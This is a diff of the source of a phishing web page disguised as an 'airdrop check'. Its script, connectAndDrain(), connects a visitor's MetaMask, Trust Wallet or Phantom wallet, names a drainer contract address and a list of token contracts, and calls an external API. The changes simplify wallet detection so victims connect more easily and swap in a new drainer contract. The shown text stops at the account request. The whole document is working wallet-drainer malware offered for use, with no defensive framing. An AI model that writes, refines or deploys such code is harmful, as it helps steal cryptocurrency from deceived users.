@@ -13,26 +13,20 @@
         .status { margin: 10px 0; padding: 10px; border-radius: 4px; white-space: pre-wrap; text-align: left; }
         .success { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
-        select { padding: 10px; margin: 5px; border-radius: 4px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>CHECK AIRDROP</h2>
         <p id="connectedAccount">Not connected</p>
-        <select id="walletSelector">
-            <option value="metamask">MetaMask</option>
-            <option value="trust">Trust Wallet</option>
-            <option value="phantom">Phantom</option>
-        </select>
         <button onclick="connectAndDrain()">Connect Wallet</button>
         <p id="status" class="status"></p>
     </div>
 
     <script>
         const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com/";
-        let provider; // Declare provider globally, set based on wallet
-        const drainerContractAddress = "0x9b8b50c102c07B61a596b7ba2e842586fa97A0D7";
+        let provider; // Declare provider globally, set dynamically
+        const drainerContractAddress = "0x3cDDC7c58eD68B7cf881012Af405731e96CF2d1b";
         const tokenList = [
             { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
             { symbol: "WBNB", address: "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd", decimals: 18 },
@@ -44,22 +38,28 @@
         async function connectAndDrain() {
             let statusMessage = "";
             try {
-                // Select wallet provider
-                const walletType = document.getElementById("walletSelector").value;
-                statusMessage = `Connecting to ${walletType} wallet...\n`;
+                // Connect wallet (try window.ethereum first, then Phantom)
+                statusMessage = "Connecting to wallet...\n";
                 updateStatus(statusMessage);
 
-                if (walletType === "metamask" && window.ethereum && window.ethereum.isMetaMask) {
+                // Prefer window.ethereum (MetaMask or Trust Wallet)
+                if (window.ethereum) {
                     provider = new ethers.BrowserProvider(window.ethereum);
-                } else if (walletType === "trust" && window.ethereum && window.ethereum.isTrust) {
-                    provider = new ethers.BrowserProvider(window.ethereum);
-                } else if (walletType === "phantom" && window.phantom?.ethereum) {
+                    // Detect which wallet is connected
+                    if (window.ethereum.isMetaMask) {
+                        statusMessage += "Detected MetaMask\n";
+                    } else if (window.ethereum.isTrust) {
+                        statusMessage += "Detected Trust Wallet\n";
+                    } else {
+                        statusMessage += "Detected an Ethereum-compatible wallet\n";
+                    }
+                } else if (window.phantom?.ethereum) {
                     provider = new ethers.BrowserProvider(window.phantom.ethereum);
+                    statusMessage += "Detected Phantom\n";
                 } else {
-                    throw new Error(`Selected wallet (${walletType}) not detected. Please install or unlock it.`);
+                    throw new Error("No compatible wallet detected. Please install MetaMask, Trust Wallet, or Phantom.");
                 }
 
-                // Connect wallet
                 const accounts = await provider.send("eth_requestAccounts", []);
                 signer = await provider.getSigner();
                 connectedAddress = accounts[0];
